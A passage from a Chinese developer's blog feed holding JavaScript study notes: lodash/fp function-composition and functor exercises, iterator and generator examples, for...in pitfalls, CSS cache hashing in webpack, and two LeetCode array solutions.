class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fp = <span class="built_in">require</span>(<span class="string">'lodash/fp'</span>)</span><br><span class="line"><span class="keyword">const</span> cars = [</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">'Ferrari FF'</span>, <span class="attr">horsepower</span>: <span class="number">660</span>, <span class="attr">dollar_value</span>: <span class="number">700000</span>, <span class="attr">in_stock</span>: <span class="literal">true</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">'Spyker C12 Zagato'</span>, <span class="attr">horsepower</span>: <span class="number">650</span>, <span class="attr">dollar_value</span>: <span class="number">648000</span>, <span class="attr">in_stock</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">'Jaguar XKR-S'</span>, <span class="attr">horsepower</span>: <span class="number">550</span>, <span class="attr">dollar_value</span>: <span class="number">132000</span>, <span class="attr">in_stock</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">'Audi R8'</span>, <span class="attr">horsepower</span>: <span class="number">525</span>, <span class="attr">dollar_value</span>: <span class="number">114200</span>, <span class="attr">in_stock</span>:<span class="literal">false</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">'Aston Martin One-77'</span>, <span class="attr">horsepower</span>: <span class="number">750</span>, <span class="attr">dollar_value</span>: <span class="number">1850000</span>, <span class="attr">in_stock</span>: <span class="literal">true</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">'Pagani Huaya'</span>, <span class="attr">horsepower</span>: <span class="number">700</span>, <span class="attr">dollar_value</span>: <span class="number">1300000</span>, <span class="attr">in_stock</span>: <span class="literal">false</span> &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 练习1，使用函数组合fp.flowRight()重新实现下面这个函数</span></span><br><span class="line"><span class="comment">// let isLastInStock = function (cars) &#123;</span></span><br><span class="line"><span class="comment">//   // 获取最后一条数据</span></span><br><span class="line"><span class="comment">//   let last_car = fp.last(cars)</span></span><br><span class="line"><span class="comment">//   // 获取 in_stock 属性值</span></span><br><span class="line"><span class="comment">//   return fp.prop('in_stock', last_car)</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> isLastInStock = fp.flowRight(fp.prop(<span class="string">'in_stock'</span>), fp.last)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 练习2：使用fp.flowRight(),fp.prop(),fp.first()获取第一个car的name</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> isFirstName = fp.flowRight(fp.prop(<span class="string">'name'</span>), fp.first)</span><br><span class="line"><span class="built_in">console</span>.log(isFirstName(cars))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 练习3：使用帮助函数_average重构averageDollarValue，使用函数组合的方式实现</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> _average = <span class="function"><span class="keyword">function</span> (<span class="params">xs</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> fp.reduce(fp.add, <span class="number">0</span>, xs) / xs.length</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 原代码</span></span><br><span class="line"><span class="comment">// let averageDollarValue = function (cars) &#123;</span></span><br><span class="line"><span class="comment">//   // dollar_values 为保存价格的数组</span></span><br><span class="line"><span class="comment">//   let dollar_values = fp.map(function (car) &#123;</span></span><br><span class="line"><span class="comment">//     return car.dollar_value</span></span><br><span class="line"><span class="comment">//   &#125;, cars)</span></span><br><span class="line"><span class="comment">//   return _average(dollar_values)</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 改进</span></span><br><span class="line"><span class="keyword">let</span> averageDollarValue = fp.flowRight(_average, fp.map())</span><br><span class="line">averageDollarValue(<span class="function"><span class="params">car</span> =&gt;</span> car.dollar_value, cars)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 练习4：使用flowRight写一个sanitizeNames()函数，返回一个</span></span><br><span class="line"><span class="comment">// 下划线连接的小写字符串，把数组中的name转换成这种形式，</span></span><br><span class="line"><span class="comment">// sanitizeNames(["Hello World"]) =&gt; ["hello_world"]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> _underscore = fp.replace(<span class="regexp">/\W+/g</span>,<span class="string">'_'</span>)</span><br><span class="line"><span class="keyword">let</span> sanitizeNames = fp.flowRight(_underscore, fp.toLower)</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fp = <span class="built_in">require</span>(<span class="string">'lodash/fp'</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Container</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">of</span>(value) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Container(value)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">constructor</span>(value) &#123;</span><br><span class="line">    <span class="keyword">this</span>._value = value</span><br><span class="line">  &#125;</span><br><span class="line">  map(fn) &#123;</span><br><span class="line">    <span class="keyword">return</span> Container.of(fn(<span class="keyword">this</span>._value))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Maybe</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">of</span>(x) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Maybe(x)</span><br><span class="line">  &#125;</span><br><span class="line">  isNothing() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>._value === <span class="literal">null</span> || <span class="keyword">this</span>._value ===<span class="literal">undefined</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">constructor</span>(x) &#123;</span><br><span class="line">    <span class="keyword">this</span>._value = x</span><br><span class="line">  &#125;</span><br><span class="line">  map(fn) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.isNothing() ? <span class="keyword">this</span> : Maybe.of(fn(<span class="keyword">this</span>._value))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 练习1：使用fp.add(x,y)和fp.map(f,x)创建一个能让functor里的值增加的函数ex1</span></span><br><span class="line"><span class="keyword">let</span> maybe = Maybe.of([<span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>])</span><br><span class="line"><span class="keyword">let</span> ex1 = <span class="function"><span class="params">arr</span> =&gt;</span> fp.map(<span class="function"><span class="params">item</span> =&gt;</span> fp.add(item, <span class="number">1</span>), arr)</span><br><span class="line"><span class="built_in">console</span>.log(maybe.map(ex1))  <span class="comment">// Maybe &#123; _value: [ 6, 7, 2 ] &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 练习2：实现一个函数ex2，能够使用fp.first获取列表的第一个元素</span></span><br><span class="line"><span class="keyword">let</span> xs = Container.of([<span class="string">'do'</span>, <span class="string">'ray'</span>, <span class="string">'me'</span>, <span class="string">'fa'</span>, <span class="string">'so'</span>, <span class="string">'la'</span>, <span class="string">'ti'</span>, <span class="string">'do'</span>])</span><br><span class="line"><span class="keyword">let</span> ex2 = <span class="function"><span class="params">arr</span> =&gt;</span> fp.first(arr)</span><br><span class="line"><span class="built_in">console</span>.log(xs.map(ex2))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 练习3：实现一个函数ex3，使用safeProp和fp.first找到user的名字的首字母</span></span><br><span class="line"><span class="keyword">let</span> safeProp = fp.curry(<span class="function"><span class="keyword">function</span> (<span class="params">x, o</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> Maybe.of(o[x])</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">let</span> user = &#123; <span class="string">'id'</span>: <span class="number">2</span>, <span class="string">'name'</span>: <span class="string">'Albert'</span> &#125;</span><br><span class="line"><span class="keyword">let</span> ex3 = <span class="function"><span class="params">obj</span> =&gt;</span> safeProp(<span class="string">'name'</span>)(obj).map(fp.first)</span><br><span class="line"><span class="built_in">console</span>.log(ex3(user))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 练习4：使用maybe重写ex4，不要有if语句</span></span><br><span class="line"><span class="comment">// let ex4 = function (n) &#123;</span></span><br><span class="line"><span class="comment">//   if (n) &#123;</span></span><br><span class="line"><span class="comment">//     return parseInt(n)</span></span><br><span class="line"><span class="comment">//   &#125;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> ex4 = <span class="function"><span class="params">n</span> =&gt;</span> Maybe.of(n).map(<span class="function"><span class="params">n</span> =&gt;</span> <span class="built_in">parseInt</span>(n))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 函数式编程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-8.14</title>
      <link href="2020/08/14/%E6%97%A5%E5%B8%B8-2020.8.14/"/>
      <url>2020/08/14/%E6%97%A5%E5%B8%B8-2020.8.14/</url>
      
        <content type="html"><![CDATA[<ul><li>Maximum call stack size exceeded</li><li>拼接参数</li><li>一个示例</li><li>css缓存问题</li><li>for..of遍历对象，可迭代</li><li>for…in的坑</li><li>指数运算符 2**10</li></ul><a id="more"></a><h2 id="Maximum-call-stack-size-exceeded"><a href="#Maximum-call-stack-size-exceeded" class="headerlink" title="Maximum call stack size exceeded"></a>Maximum call stack size exceeded</h2><p>一般这种错误是指超出最大调用堆栈大小，出现场景：递归调用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">            <span class="built_in">Object</span>.defineProperty(obj,key,&#123;</span><br><span class="line">                get: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">`get key = <span class="subst">$&#123;obj[key]&#125;</span>`</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在执行obj.key时会出现该错误</span></span><br></pre></td></tr></table></figure><h2 id="拼接参数"><a href="#拼接参数" class="headerlink" title="拼接参数"></a>拼接参数</h2><ul><li>如何保证有这个参数时拼接，没有的时候不拼接呢</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> options = &#123;</span><br><span class="line">       <span class="string">'name'</span>: <span class="keyword">this</span>.name,</span><br><span class="line">       <span class="string">'age'</span>: <span class="keyword">this</span>.age,</span><br><span class="line">       <span class="string">'sex'</span>: <span class="keyword">this</span>.sex</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">let</span> paramsurl = <span class="string">''</span></span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">const</span> key <span class="keyword">in</span> options) &#123;</span><br><span class="line">       <span class="keyword">const</span> value = options[key]</span><br><span class="line">       value &amp;&amp;</span><br><span class="line">         (paramsurl += paramsurl ? <span class="string">`&amp;<span class="subst">$&#123;key&#125;</span>=<span class="subst">$&#123;value&#125;</span>`</span> : <span class="string">`<span class="subst">$&#123;key&#125;</span>=<span class="subst">$&#123;value&#125;</span>`</span>)</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><h2 id="一个示例"><a href="#一个示例" class="headerlink" title="一个示例"></a>一个示例</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    max(a,b) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Math</span>.max(a,b)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 优化为</span></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    max: <span class="built_in">Math</span>.max</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="css缓存问题"><a href="#css缓存问题" class="headerlink" title="css缓存问题"></a>css缓存问题</h2><p>修改css文件进行发布时，文件名如果不变，浏览器可能直接去取缓存，为了解决这个问题，在文件名后面加hash随机值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在webpack.prod.conf.js中的配置</span></span><br><span class="line"><span class="keyword">new</span> ExtractTextPlugin(&#123; </span><br><span class="line">      filename: utils.assetsPath(<span class="string">'css/[name].[chunkhash:8].css'</span>), <span class="comment">//css/[name].[contenthash].css</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="for-of遍历对象，可迭代接口"><a href="#for-of遍历对象，可迭代接口" class="headerlink" title="for..of遍历对象，可迭代接口"></a>for..of遍历对象，可迭代接口</h2><p>当我们用for…of遍历对象时</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123; <span class="attr">foo</span>: <span class="number">123</span>, <span class="attr">bar</span>: <span class="number">456</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">const</span> item <span class="keyword">of</span> obj) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(item)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 报错 obj is not iterable</span></span><br></pre></td></tr></table></figure><p>Array,Set,Map都有Iterator属性，所以可以用for…of遍历</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">arr[<span class="built_in">Symbol</span>.iterator]()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Array Iterator &#123;&#125; 其中还有next方法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> iterator = arr[<span class="built_in">Symbol</span>.iterator]()</span><br><span class="line">iterator.next() <span class="comment">// &#123;value: 1, done: false&#125;</span></span><br><span class="line">iterator.next() <span class="comment">// &#123;value: 2, done: false&#125;</span></span><br><span class="line">iterator.next() <span class="comment">// &#123;value: 3, done: false&#125;</span></span><br><span class="line">iterator.next() <span class="comment">// &#123;value: undefined, done: true&#125;</span></span><br></pre></td></tr></table></figure><p>for..of其实就是去调用iterator接口</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 迭代器模式</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 场景：协同开发一个任务清单</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// a的代码</span></span><br><span class="line"><span class="keyword">const</span> todos = &#123;</span><br><span class="line">    life: [<span class="string">'吃饭'</span>, <span class="string">'睡觉'</span>, <span class="string">'打豆豆'</span>],</span><br><span class="line">    learn: [<span class="string">'语文'</span>, <span class="string">'数学'</span>, <span class="string">'外语'</span>],</span><br><span class="line">    work: [<span class="string">'喝茶'</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// b的代码,需要知道对象结构</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> item <span class="keyword">of</span> todos.life) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(item)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> item <span class="keyword">of</span> todos.learn) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(item)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> item <span class="keyword">of</span> todos.work) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(item)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这时如果我在a代码的todos对象中加一个接口</span></span><br><span class="line">each: <span class="function"><span class="keyword">function</span> (<span class="params">callback</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> all = [].concat(<span class="keyword">this</span>.life, <span class="keyword">this</span>.learn, <span class="keyword">this</span>.work)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">const</span> item <span class="keyword">of</span> all) &#123;</span><br><span class="line">        callback(item)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// b中就可以这样调用</span></span><br><span class="line">todo.each(<span class="function"><span class="params">item</span> =&gt;</span> <span class="built_in">console</span>.log(item))</span><br></pre></td></tr></table></figure><p>迭代器实现：对外提供统一遍历接口</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> todos = &#123;</span><br><span class="line">    life: [<span class="string">'吃饭'</span>, <span class="string">'睡觉'</span>, <span class="string">'打豆豆'</span>],</span><br><span class="line">    learn: [<span class="string">'语文'</span>, <span class="string">'数学'</span>, <span class="string">'外语'</span>],</span><br><span class="line">    work: [<span class="string">'喝茶'</span>],</span><br><span class="line">    </span><br><span class="line">    [<span class="built_in">Symbol</span>.iterator]: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> all = [...this.life, ...this.learn, ...this.work]</span><br><span class="line">        <span class="keyword">let</span> index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            next: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> &#123;</span><br><span class="line">                    value: all[index]</span><br><span class="line">                    done: index++ &gt;= all.length</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">const</span> item <span class="keyword">of</span> todos) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(item)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成器实现迭代器</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> todos = &#123;</span><br><span class="line">    life: [<span class="string">'吃饭'</span>, <span class="string">'睡觉'</span>, <span class="string">'打豆豆'</span>],</span><br><span class="line">    learn: [<span class="string">'语文'</span>, <span class="string">'数学'</span>, <span class="string">'外语'</span>],</span><br><span class="line">    work: [<span class="string">'喝茶'</span>],</span><br><span class="line">    </span><br><span class="line">    [<span class="built_in">Symbol</span>.iterator]: <span class="function"><span class="keyword">function</span> * (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> all = [...this.life, ...this.learn, ...this.work]</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">const</span> item <span class="keyword">of</span> all) &#123;</span><br><span class="line">            <span class="keyword">yield</span> item</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">const</span> item <span class="keyword">of</span> todos) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(item)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="for…in的坑"><a href="#for…in的坑" class="headerlink" title="for…in的坑"></a>for…in的坑</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i <span class="keyword">in</span> arr)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i + <span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="comment">// 01</span></span><br><span class="line"><span class="comment">// 11</span></span><br><span class="line"><span class="comment">// 21</span></span><br><span class="line"><span class="comment">// 31</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.8.6</title>
      <link href="2020/08/06/%E6%97%A5%E5%B8%B8-2020.8.6/"/>
      <url>2020/08/06/%E6%97%A5%E5%B8%B8-2020.8.6/</url>
      
        <content type="html"><![CDATA[<ul><li>算法：删除排序数组中的重复项，移除元素</li><li>webview</li><li>对象的Observer属性</li></ul><a id="more"></a><h2 id="删除排序数组中的重复项"><a href="#删除排序数组中的重复项" class="headerlink" title="删除排序数组中的重复项"></a>删除排序数组中的重复项</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">示例 1:</span><br><span class="line"></span><br><span class="line">给定数组 nums = [1,1,2], </span><br><span class="line"></span><br><span class="line">函数应该返回新的长度 2, 并且原数组 nums 的前两个元素被修改为 1, 2。 (注意只需修改，不需删除)</span><br><span class="line"></span><br><span class="line">你不需要考虑数组中超出新长度后面的元素。</span><br><span class="line"></span><br><span class="line">示例 2:</span><br><span class="line"></span><br><span class="line">给定 nums = [0,0,1,1,1,2,2,3,3,4],</span><br><span class="line"></span><br><span class="line">函数应该返回新的长度 5, 并且原数组 nums 的前五个元素被修改为 0, 1, 2, 3, 4。</span><br><span class="line"></span><br><span class="line">你不需要考虑数组中超出新长度后面的元素。</span><br></pre></td></tr></table></figure><ul><li>遍历一次，不重复的放在数组前几位，时间复杂度O（n)</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> removeDuplicates = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> len = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[i]!==nums[i<span class="number">-1</span>]) nums[len++] = nums[i]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> len</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="移除元素"><a href="#移除元素" class="headerlink" title="移除元素"></a>移除元素</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">给定 nums = [3,2,2,3], val = 3,</span><br><span class="line"></span><br><span class="line">函数应该返回新的长度 2, 并且 nums 中的前两个元素均为 2。</span><br><span class="line"></span><br><span class="line">你不需要考虑数组中超出新长度后面的元素。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">给定 nums = [0,1,2,2,3,0,4,2], val = 2,</span><br><span class="line"></span><br><span class="line">函数应该返回新的长度 5, 并且 nums 中的前五个元素为 0, 1, 3, 0, 4。</span><br><span class="line"></span><br><span class="line">注意这五个元素可为任意顺序。</span><br><span class="line"></span><br><span class="line">你不需要考虑数组中超出新长度后面的元素。</span><br></pre></td></tr></table></figure><ul><li>跟上题思路一样</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> removeElement = <span class="function"><span class="keyword">function</span>(<span class="params">nums, val</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> len = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[i] !== val) nums[len++] = nums[i]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> len</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="webview"><a href="#webview" class="headerlink" title="webview"></a>webview</h2><p><strong>承载网页的容器。会自动铺满整个小程序页面</strong></p><p>官方文档：<a href="https://developers.weixin.qq.com/miniprogram/dev/component/web-view.html" target="_blank" rel="noopener">https://developers.weixin.qq.com/miniprogram/dev/component/web-view.html</a> </p><h2 id="对象的Observer属性"><a 